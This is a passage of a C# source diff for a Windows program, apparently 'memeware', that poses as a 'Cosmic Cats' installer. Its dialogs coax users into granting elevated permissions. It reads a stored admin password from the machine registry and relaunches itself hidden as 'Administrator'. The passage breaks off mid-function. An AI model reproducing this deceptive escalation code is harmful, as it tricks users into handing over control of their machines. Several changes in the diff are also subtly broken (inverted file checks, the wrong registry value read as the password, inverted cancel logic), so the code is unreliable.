@@ -2,164 +2,158 @@
 {
     public static class Program
     {
-        //Approved 07/30/2022 12:31am
+        //Approved 07/30/2022 3:13pm
         public static void Main()
         {
             #region Main
-
-            #region DebugFlags
-            bool debugFlag_Main_A = false;
-            #endregion
-
-            try
             {
-                if (IsInstalled())
-                {
-                    if (IsAdmin())
-                    {
-                        Run();
-                    }
-                    else
-                    {
-                        ElevateSelf();
-                    }
-                }
-                else
-                {
-                    if (IsAdmin())
-                    {
-                        Install();
-                    }
-                    else
-                    {
-                        BegForAdmin();
-                    }
-                }
-            }
-            catch
-            {
-                debugFlag_Main_A = true;
-            }
-
-            #region SaveDebugFlags
-            try
-            {
-                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-                mysteryMemeware.SetValue("debugFlag_Main_A", debugFlag_Main_A);
-
-                mysteryMemeware.Close();
-                mysteryMemeware.Dispose();
-
-                localMachine.Close();
-                localMachine.Dispose();
-            }
-            catch
-            {
-
-            }
-            #endregion
-
-            #endregion
-
-            #region Kill Current Process
-
-            #region DebugFlags
-            bool debugFlag_Kill_A = false;
-            #endregion
-
-            try
-            {
-                System.Diagnostics.Process.GetCurrentProcess().Kill();
-            }
-            catch
-            {
-                debugFlag_Kill_A = true;
-            }
-
-            #region SaveDebugFlags
-            try
-            {
-                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-                mysteryMemeware.SetValue("debugFlag_Kill_A", debugFlag_Kill_A);
-
-                mysteryMemeware.Close();
-                mysteryMemeware.Dispose();
-
-                localMachine.Close();
-                localMachine.Dispose();
-            }
-            catch
-            {
-
-            }
-            #endregion
-
-            #endregion
-        }
-        //Approved 07/30/2022 12:32am
-        public static bool IsInstalled()
-        {
-            #region IsInstalled
-
-            #region DebugFlags
-            bool debugFlag_IsInstalled_A = false;
-            bool debugFlag_IsInstalled_A_0 = false;
-            bool debugFlag_IsInstalled_A_1 = false;
-            bool debugFlag_IsInstalled_A_2 = false;
-            bool debugFlag_IsInstalled_A_3 = false;
-            #endregion
-
-            bool isInstalled = false;
-
-            try
-            {
-                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-                object isInstalledObject = mysteryMemeware.GetValue("IsInstalled", null);
-
+                #region DebugFlags
+                bool debugFlag_Main_A = false;
+                bool debugFlag_Main_A_0 = false;
+                #endregion
                 try
                 {
-                    mysteryMemeware.Close();
-                    mysteryMemeware.Dispose();
+                    if (IsInstalled())
+                    {
+                        if (IsAdmin())
+                        {
+                            Run();
+                        }
+                        else
+                        {
+                            bool elevationSuccessful = SelfElevate();
+                            if (!elevationSuccessful)
+                            {
+                                debugFlag_Main_A_0 = true;
+                                Run();
+                            }
+                        }
+                    }
+                    else
+                    {
+                        if (IsAdmin())
+                        {
+                            Install();
+                        }
+                        else
+                        {
+                            BegForAdmin();
+                        }
+                    }
                 }
                 catch
                 {
-                    debugFlag_IsInstalled_A_0 = true;
+                    debugFlag_Main_A = true;
                 }
-
+                #region SaveDebugFlags
                 try
                 {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("Main_A", debugFlag_Main_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("Main_A_0", debugFlag_Main_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
                     localMachine.Close();
                     localMachine.Dispose();
                 }
                 catch
                 {
-                    debugFlag_IsInstalled_A_1 = true;
+
                 }
-
-                System.Type isInstalledType = isInstalledObject.GetType();
-
-                if (isInstalledType == typeof(string))
+                #endregion
+            }
+            #endregion
+            #region Kill Current Process
+            {
+                #region DebugFlags
+                bool debugFlag_Kill_A = false;
+                #endregion
+                try
                 {
-                    string isInstalledString = (string)isInstalledObject;
+                    System.Diagnostics.Process.GetCurrentProcess().Kill();
+                }
+                catch
+                {
+                    debugFlag_Kill_A = true;
+                }
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("Kill_A", debugFlag_Kill_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
+                }
+                catch
+                {
 
+                }
+                #endregion
+            }
+            #endregion
+        }
+        //Approved 07/30/2022 3:13pm
+        public static bool IsInstalled()
+        {
+            #region IsInstalled
+            bool isInstalled = false;
+            {
+                #region DebugFlags
+                bool debugFlag_IsInstalled_A = false;
+                bool debugFlag_IsInstalled_A_0 = false;
+                bool debugFlag_IsInstalled_A_1 = false;
+                bool debugFlag_IsInstalled_A_2 = false;
+                bool debugFlag_IsInstalled_A_3 = false;
+                bool debugFlag_IsInstalled_A_4 = false;
+                #endregion
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+                    object isInstalledObject = mysteryMemeware.GetValue("IsInstalled", null);
+                    try
+                    {
+                        mysteryMemeware.Close();
+                        mysteryMemeware.Dispose();
+                    }
+                    catch
+                    {
+                        debugFlag_IsInstalled_A_0 = true;
+                    }
+                    try
+                    {
+                        localMachine.Close();
+                        localMachine.Dispose();
+                    }
+                    catch
+                    {
+                        debugFlag_IsInstalled_A_1 = true;
+                    }
+                    if (isInstalledObject is null)
+                    {
+                        debugFlag_IsInstalled_A_2 = true;
+
+                        throw null;
+                    }
+                    if (isInstalledObject.GetType() != typeof(string))
+                    {
+                        debugFlag_IsInstalled_A_3 = true;
+
+                        throw null;
+                    }
+                    string isInstalledString = (string)isInstalledObject;
                     try
                     {
                         isInstalledString = isInstalledString.ToLower();
                     }
                     catch
                     {
-                        debugFlag_IsInstalled_A_2 = true;
+                        debugFlag_IsInstalled_A_4 = true;
                     }
-
                     if (isInstalledString is "1" || isInstalledString is "true" || isInstalledString is "t" || isInstalledString is "yes" || isInstalledString is "y")
                     {
                         isInstalled = true;
@@ -169,502 +163,601 @@
                         isInstalled = false;
                     }
                 }
-                else if (isInstalledType == typeof(int))
+                catch
                 {
-                    int isInstalledInt = (int)isInstalledObject;
-
-                    if (isInstalledInt is 1)
-                    {
-                        isInstalled = true;
-                    }
-                    else
-                    {
-                        isInstalled = false;
-                    }
+                    debugFlag_IsInstalled_A = true;
                 }
-                else if (isInstalledType == typeof(long))
+                #region SaveDebugFlags
+                try
                 {
-                    long isInstalledLong = (long)isInstalledObject;
-
-                    if (isInstalledLong is 1)
-                    {
-                        isInstalled = true;
-                    }
-                    else
-                    {
-                        isInstalled = false;
-                    }
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("IsInstalled_A", debugFlag_IsInstalled_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("IsInstalled_A_0", debugFlag_IsInstalled_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("IsInstalled_A_1", debugFlag_IsInstalled_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("IsInstalled_A_2", debugFlag_IsInstalled_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("IsInstalled_A_3", debugFlag_IsInstalled_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("IsInstalled_A_4", debugFlag_IsInstalled_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
                 }
-                else
+                catch
                 {
-                    debugFlag_IsInstalled_A_3 = true;
 
-                    throw null;
                 }
+                #endregion
             }
-            catch
-            {
-                debugFlag_IsInstalled_A = true;
-            }
-
-            #region SaveDebugFlags
-            try
-            {
-                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-                mysteryMemeware.SetValue("debugFlag_IsInstalled_A", debugFlag_IsInstalled_A);
-                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_0", debugFlag_IsInstalled_A_0);
-                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_1", debugFlag_IsInstalled_A_1);
-                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_2", debugFlag_IsInstalled_A_2);
-                mysteryMemeware.SetValue("debugFlag_IsInstalled_A_3", debugFlag_IsInstalled_A_3);
-
-                mysteryMemeware.Close();
-                mysteryMemeware.Dispose();
-
-                localMachine.Close();
-                localMachine.Dispose();
-            }
-            catch
-            {
-
-            }
-            #endregion
-
-            #endregion
-
             return isInstalled;
+            #endregion
         }
-        //Approved 07/30/2022 12:33am
+        //Approved 07/30/2022 3:13pm
         public static bool IsAdmin()
         {
             #region IsAdmin
-
-            #region DebugFlags
-            bool debugFlag_IsAdmin_A = false;
-            bool debugFlag_IsAdmin_A_0 = false;
-            #endregion
-
             bool isAdmin = false;
-
-            try
             {
-                System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
-
-                System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
-
-                bool possibleIsAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
-
+                #region DebugFlags
+                bool debugFlag_IsAdmin_A = false;
+                bool debugFlag_IsAdmin_A_0 = false;
+                #endregion
                 try
                 {
-                    identity.Dispose();
+                    System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
+                    System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
+                    bool possibleIsAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+                    try
+                    {
+                        identity.Dispose();
+                    }
+                    catch
+                    {
+                        debugFlag_IsAdmin_A_0 = true;
+                    }
+                    isAdmin = possibleIsAdmin;
                 }
                 catch
                 {
-                    debugFlag_IsAdmin_A_0 = true;
+                    debugFlag_IsAdmin_A = true;
                 }
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("IsAdmin_A", debugFlag_IsAdmin_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("IsAdmin_A_0", debugFlag_IsAdmin_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
+                }
+                catch
+                {
 
-                isAdmin = possibleIsAdmin;
+                }
+                #endregion
             }
-            catch
-            {
-                debugFlag_IsAdmin_A = true;
-            }
-
-            #region SaveDebugFlags
-            try
-            {
-                Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-                Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-                mysteryMemeware.SetValue("debugFlag_IsAdmin_A", debugFlag_IsAdmin_A);
-                mysteryMemeware.SetValue("debugFlag_IsAdmin_A_0", debugFlag_IsAdmin_A_0);
-
-                mysteryMemeware.Close();
-                mysteryMemeware.Dispose();
-
-                localMachine.Close();
-                localMachine.Dispose();
-            }
-            catch
-            {
-
-            }
-            #endregion
-
-            #endregion
-
             return isAdmin;
+            #endregion
         }
-        //Approved 07/29/2022 12:24am
-        public static void ElevateSelf()
+        //Approved 07/30/2022 3:13pm
+        public static bool SelfElevate()
         {
             #region GetAdminPass
-
             string adminPassword = null;
-
-            try
             {
-                Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
-
-                Microsoft.Win32.RegistryKey mysteryMemeware = LocalMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
-
-                object adminPasswordObject = mysteryMemeware.GetValue("AdminPassword");
-
+                #region DebugFlags
+                bool debugFlag_GetAdminPass_A = false;
+                bool debugFlag_GetAdminPass_A_0 = false;
+                bool debugFlag_GetAdminPass_A_1 = false;
+                bool debugFlag_GetAdminPass_A_2 = false;
+                bool debugFlag_GetAdminPass_A_3 = false;
+                bool debugFlag_GetAdminPass_A_4 = false;
+                #endregion
                 try
                 {
-                    mysteryMemeware.Close();
-                    mysteryMemeware.Dispose();
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
+                    object adminPasswordObject = mysteryMemeware.GetValue("IsInstalled", null);
+                    try
+                    {
+                        mysteryMemeware.Close();
+                        mysteryMemeware.Dispose();
+                    }
+                    catch
+                    {
+                        debugFlag_GetAdminPass_A_0 = true;
+                    }
+                    try
+                    {
+                        localMachine.Close();
+                        localMachine.Dispose();
+                    }
+                    catch
+                    {
+                        debugFlag_GetAdminPass_A_1 = true;
+                    }
+                    if (adminPasswordObject is null)
+                    {
+                        debugFlag_GetAdminPass_A_2 = true;
+
+                        throw null;
+                    }
+                    if (adminPasswordObject.GetType() != typeof(string))
+                    {
+                        debugFlag_GetAdminPass_A_3 = true;
+
+                        throw null;
+                    }
+                    string potentialAdminPassword = (string)adminPasswordObject;
+                    try
+                    {
+                        potentialAdminPassword = potentialAdminPassword.ToLower();
+                    }
+                    catch
+                    {
+                        debugFlag_GetAdminPass_A_4 = true;
+                    }
+                    adminPassword = potentialAdminPassword;
+                }
+                catch
+                {
+                    debugFlag_GetAdminPass_A = true;
+                }
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("GetAdminPass_A", debugFlag_GetAdminPass_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("GetAdminPass_A_0", debugFlag_GetAdminPass_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("GetAdminPass_A_1", debugFlag_GetAdminPass_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("GetAdminPass_A_2", debugFlag_GetAdminPass_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("GetAdminPass_A_3", debugFlag_GetAdminPass_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("GetAdminPass_A_4", debugFlag_GetAdminPass_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
                 }
                 catch
                 {
 
                 }
-
-                try
-                {
-                    LocalMachine.Close();
-                    LocalMachine.Dispose();
-                }
-                catch
-                {
-
-                }
-
-                if (adminPasswordObject.GetType() != typeof(string))
-                {
-                    throw null;
-                }
-
-                string adminPasswordString = (string)adminPasswordObject;
+                #endregion
             }
-            catch
-            {
-                try
-                {
-                    adminPassword = "";
-                }
-                catch
-                {
-
-                }
-            }
-
             #endregion
-
-            #region Locate Current Executable
-
+            #region LocateExe
             string currentExecutablePath = null;
-
-            try
             {
-                string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
+                #region DebugFlags
+                bool debugFlag_LocateExe_A = false;
+                bool debugFlag_LocateExe_A_0 = false;
+                bool debugFlag_LocateExe_A_1 = false;
 
+                bool debugFlag_LocateExe_B = false;
+                bool debugFlag_LocateExe_B_0 = false;
+                bool debugFlag_LocateExe_B_1 = false;
+                #endregion
                 try
                 {
-                    potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
-                }
-                catch
-                {
-
-                }
-
-                if (System.IO.File.Exists(potentialCurrentExecutablePath))
-                {
-                    currentExecutablePath = potentialCurrentExecutablePath;
-                }
-                else
-                {
-                    throw null;
-                }
-            }
-            catch
-            {
-                try
-                {
-                    string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-
+                    string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
                     try
                     {
                         potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                     }
                     catch
                     {
-
+                        debugFlag_LocateExe_A_0 = true;
                     }
-
                     if (System.IO.File.Exists(potentialCurrentExecutablePath))
                     {
-                        currentExecutablePath = potentialCurrentExecutablePath;
-                    }
-                    else
-                    {
+                        debugFlag_LocateExe_A_1 = true;
                         throw null;
                     }
+                    currentExecutablePath = potentialCurrentExecutablePath;
+                }
+                catch
+                {
+                    debugFlag_LocateExe_A = true;
+                    try
+                    {
+                        string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                        try
+                        {
+                            potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
+                        }
+                        catch
+                        {
+                            debugFlag_LocateExe_B_0 = true;
+                        }
+                        if (System.IO.File.Exists(potentialCurrentExecutablePath))
+                        {
+                            debugFlag_LocateExe_B_1 = true;
+                            throw null;
+                        }
+                        currentExecutablePath = potentialCurrentExecutablePath;
+                    }
+                    catch
+                    {
+                        debugFlag_LocateExe_B = true;
+                    }
+                }
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("debugFlag_LocateExe_A", debugFlag_LocateExe_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_A_0", debugFlag_LocateExe_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_A_1", debugFlag_LocateExe_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_B", debugFlag_LocateExe_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_B_0", debugFlag_LocateExe_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_LocateExe_B_1", debugFlag_LocateExe_B_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
                 }
                 catch
                 {
 
                 }
+                #endregion
             }
-
             #endregion
-
-            #region Elevate
-
-            try
+            #region SelfElevate
+            bool selfElevateSuccessful = false;
             {
+                #region DebugFlags
+                bool debugFlag_SelfElevate_A = false;
+                bool debugFlag_SelfElevate_A_0 = false;
+                bool debugFlag_SelfElevate_A_1 = false;
+                bool debugFlag_SelfElevate_A_2 = false;
+                bool debugFlag_SelfElevate_A_3 = false;
+                bool debugFlag_SelfElevate_A_4 = false;
+                #endregion
                 try
                 {
                     if (adminPassword is null)
                     {
+                        debugFlag_SelfElevate_A_0 = true;
                         throw null;
                     }
-
                     if (currentExecutablePath is null)
                     {
+                        debugFlag_SelfElevate_A_1 = true;
                         throw null;
                     }
-
-
-                    System.Diagnostics.ProcessStartInfo adminRestartStartInfo = new System.Diagnostics.ProcessStartInfo();
-
-                    adminRestartStartInfo.Arguments = "";
-                    adminRestartStartInfo.CreateNoWindow = true;
-                    adminRestartStartInfo.Domain = null;
-                    adminRestartStartInfo.ErrorDialog = false;
-                    adminRestartStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
-                    adminRestartStartInfo.FileName = currentExecutablePath;
-                    adminRestartStartInfo.LoadUserProfile = false;
-                    adminRestartStartInfo.Password = null;
-                    adminRestartStartInfo.PasswordInClearText = adminPassword;
-                    adminRestartStartInfo.RedirectStandardError = false;
-                    adminRestartStartInfo.RedirectStandardInput = false;
-                    adminRestartStartInfo.RedirectStandardOutput = false;
-                    adminRestartStartInfo.StandardErrorEncoding = null;
-                    adminRestartStartInfo.StandardOutputEncoding = null;
-                    adminRestartStartInfo.UserName = "Administrator";
-                    adminRestartStartInfo.UseShellExecute = false;
-                    adminRestartStartInfo.Verb = "";
-                    adminRestartStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-
+                    System.Diagnostics.ProcessStartInfo selfElevateStartInfo = new System.Diagnostics.ProcessStartInfo();
+                    selfElevateStartInfo.Arguments = "";
+                    selfElevateStartInfo.CreateNoWindow = true;
+                    selfElevateStartInfo.Domain = null;
+                    selfElevateStartInfo.ErrorDialog = false;
+                    selfElevateStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
+                    selfElevateStartInfo.FileName = currentExecutablePath;
+                    selfElevateStartInfo.LoadUserProfile = false;
+                    selfElevateStartInfo.Password = null;
+                    selfElevateStartInfo.PasswordInClearText = adminPassword;
+                    selfElevateStartInfo.RedirectStandardError = false;
+                    selfElevateStartInfo.RedirectStandardInput = false;
+                    selfElevateStartInfo.RedirectStandardOutput = false;
+                    selfElevateStartInfo.StandardErrorEncoding = null;
+                    selfElevateStartInfo.StandardOutputEncoding = null;
+                    selfElevateStartInfo.UserName = "Administrator";
+                    selfElevateStartInfo.UseShellExecute = false;
+                    selfElevateStartInfo.Verb = "";
+                    selfElevateStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                     try
                     {
-                        adminRestartStartInfo.WorkingDirectory = (new System.IO.DirectoryInfo(currentExecutablePath)).FullName;
+                        selfElevateStartInfo.WorkingDirectory = (new System.IO.FileInfo(currentExecutablePath)).DirectoryName;
                     }
                     catch
                     {
+                        debugFlag_SelfElevate_A_2 = true;
                         try
                         {
-                            adminRestartStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
+                            selfElevateStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
                         }
                         catch
                         {
+                            debugFlag_SelfElevate_A_3 = true;
                             try
                             {
-                                adminRestartStartInfo.WorkingDirectory = null;
+                                selfElevateStartInfo.WorkingDirectory = null;
                             }
                             catch
                             {
-
+                                debugFlag_SelfElevate_A_4 = true;
                             }
                         }
                     }
-
-                    System.Diagnostics.Process.Start(adminRestartStartInfo);
+                    System.Diagnostics.Process.Start(selfElevateStartInfo);
+                    selfElevateSuccessful = true;
                 }
                 catch
                 {
-                    throw null;
+                    debugFlag_SelfElevate_A = true;
                 }
-            }
-            catch
-            {
+                #region SaveDebugFlags
                 try
                 {
-                    Run();
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("debugFlag_SelfElevate_A =", debugFlag_SelfElevate_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_SelfElevate_A_0", debugFlag_SelfElevate_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_SelfElevate_A_1", debugFlag_SelfElevate_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_SelfElevate_A_2", debugFlag_SelfElevate_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_SelfElevate_A_3", debugFlag_SelfElevate_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_SelfElevate_A_4", debugFlag_SelfElevate_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.Close();
+                    debugFlags.Dispose();
+                    localMachine.Close();
+                    localMachine.Dispose();
                 }
                 catch
                 {
 
                 }
+                #endregion
             }
-
+            return selfElevateSuccessful;
             #endregion
         }
-        //Approved 07/29/2022 12:55am
+        //Approved 07/30/2022 3:13pm
         public static void BegForAdmin()
         {
-            #region Display Prompt 1
-
-            try
+            #region ShowPopups
+            bool userSelectedCancel = false;
             {
-                if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
-                {
-                    return;
-                }
-            }
-            catch
-            {
-
-            }
-
-            #endregion
-
-            #region Display Prompt 2
-
-            try
-            {
-                if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
-                {
-                    return;
-                }
-            }
-            catch
-            {
-
-            }
-
-            #endregion
-
-            #region Locate Current Executable
-
-            string currentExecutablePath = null;
-
-            try
-            {
-                string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
-
+                #region DebugFlags
+                bool debugFlag_ShowPopups_A = false;
+                bool debugFlag_ShowPopups_B = false;
+                bool debugFlag_ShowPopups_B_0 = false;
+                #endregion
                 try
                 {
-                    potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
+                    if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
+                    {
+                        userSelectedCancel = true;
+                    }
+                }
+                catch
+                {
+                    debugFlag_ShowPopups_A = true;
+                }
+                try
+                {
+                    if (!userSelectedCancel)
+                    {
+                        debugFlag_ShowPopups_B_0 = true;
+                        throw null;
+                    }
+                    if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
+                    {
+                        userSelectedCancel = true;
+                    }
+                }
+                catch
+                {
+                    debugFlag_ShowPopups_B = true;
+                }
+                #region SaveDebugFlags
+                try
+                {
+                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
+                    Microsoft.Win32.RegistryKey debugFlags = localMachine.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
+                    debugFlags.SetValue("debugFlag_ShowPopups_A", debugFlag_ShowPopups_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_ShowPopups_B", debugFlag_ShowPopups_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
+                    debugFlags.SetValue("debugFlag_ShowPopups_B_0", debugFlag_ShowPopups_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
